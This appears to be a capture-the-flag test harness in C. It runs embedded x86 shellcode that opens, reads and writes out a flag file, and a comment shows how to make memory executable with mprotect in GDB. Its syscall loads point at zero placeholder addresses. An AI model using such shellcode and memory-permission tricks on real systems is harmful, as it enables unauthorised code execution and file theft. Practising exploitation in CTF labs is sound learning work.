#include <stdio.h>
#include <string.h>

/*  ----- NOTE ABOUT COMPILING AND RUNNING THIS PROGRAM -----
This opens /bruhbruh/flag instead of /home/orw/flag. You will also need to give the .bss
RWX permissions, which you can do in GDB with the command

call (int) mprotect(0x0000555555558000, 0x1000, 7) 
    ----- NOTE ABOUT COMPILING AND RUNNING THIS PROGRAM -----  */
unsigned char shellcode[] = 
"\x68\x01\x01\x01\x01\x81\x34\x24\x60\x66\x01\x01\x68\x68\x2F\x66\x6C\x68\x68\x62\x72\x75\x68\x2F\x62\x72\x75\x89\xE3\x31\xC9\x31\xD2\xFF\x35\x00\x00\x00\x00\x58\xCD\x80\x6A\x03\x5B\x89\xE1\x31\xD2\xB6\x01\xFF\x35\x00\x00\x00\x00\x58\xCD\x80\x6A\x01\x5B\x89\xE1\x31\xD2\xB6\x01\xFF\x35\x00\x00\x00\x00\x58\xCD\x80"
"\xcc";        // Use "\xcc" to trigger a breakpoint for debugging

int main() {

    // Create function ptr to execute shellcode
    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}